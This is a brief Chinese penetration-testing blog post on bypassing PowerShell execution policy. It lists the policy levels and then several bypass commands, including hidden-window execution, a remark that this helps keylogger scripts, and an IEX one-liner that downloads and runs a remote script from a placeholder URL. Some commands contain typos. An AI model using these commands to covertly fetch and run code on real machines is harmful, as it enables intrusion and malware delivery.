---
title: PowerShell执行策略的简单绕过
categories:
- 渗透测试
tags:
- PowerShel
abbrlink: 15127
date: 2020-05-09 18:18:29
keywords:
description:
---
  
#### 执行策略
```bash
Get-ExecutionPolicy   #查看当前策略

# 四种
- Restricted        #脚本不能运行（默认）
- RemoteSigned      #本地创建的脚本可以运行，但从网上下载的脚本不能运行
- AllSigned         #仅当脚本由信任的发布者签名时才能运行
- Unrestricted      #允许所有的脚本运行

# 设置PowerShell执行策略
Set-ExecutionPolicy <策略名>
```
  
#### 绕过
1.
```
# 先设置当前用户的执行策略为Unrestricted，也算是去更改了当前的全局策略
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted 
# 再执行脚本
```

2.
```
# 或是下面这种，-Windowstyle hidden 可以让我们的执行无任何弹窗, -NoProfile不加载当前用户配置
powershell.exe -executionpolicy bypass -Windowstyle hidden -Noninteractive -nologo -NoProfile -File xxx.sp1

# Noexit  执行结束不退出shell(对键盘记录等脚本非常有用)
```

3.
```
# 绕过本地权限执行
PowerShell.exe -ExecutionPolicy Bypass -File xxx.sp11
```

4.
```
# 用IEX下载远程PS1脚本绕过
PowerShell.exe -ExecutionPolicy Bypass  -Windowstyle hidden -Noninteractive -NoProfile IEX(New-ObjectNet.WebClient).DownloadString("http://xxxxx.xxx.ps1");[Parameters]
```

5.更多执行策略绕过: 
```
https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy
```
